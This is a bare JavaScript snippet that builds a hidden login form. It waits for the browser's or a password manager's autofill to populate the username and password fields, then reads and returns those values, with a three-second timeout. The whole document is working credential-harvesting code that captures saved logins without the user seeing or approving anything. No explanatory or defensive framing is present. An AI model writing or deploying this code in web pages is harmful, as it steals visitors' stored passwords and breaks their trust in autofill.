await new Promise((resolve, reject) => {
    var form, timeoutId;
    function removeElement() {
        try { if (form) form.remove() } catch (e) { }
    }
    function clearMyTimeout() {
        try { if (timeoutId) clearTimeout(timeoutId) } catch (e) { }
    }
    try {
        form = document.createElement('form');
        form.style.display = 'none';
        form.innerHTML = (
            `<input type=text name=id autocomplete=username>` +
            `<input type=password name=password autocomplete=current-password>`
        );
        function res() {
            try {
                const out = Object.fromEntries(new FormData(form));
                removeElement();
                resolve(out);
            } catch (e) {
                removeElement();
                reject(e);
            }
        }
        function oninput() {
            if (form.lastChild.value && form.firstChild.value) {
                clearMyTimeout();
                res();
            }
        }
        form.firstChild.addEventListener('input', oninput)
        form.lastChild.addEventListener('input', oninput)
        document.body.appendChild(form);
        timeoutId = setTimeout(res, 3000);
    } catch (e) {
        removeElement();
        clearMyTimeout();
        reject(e);
    }
})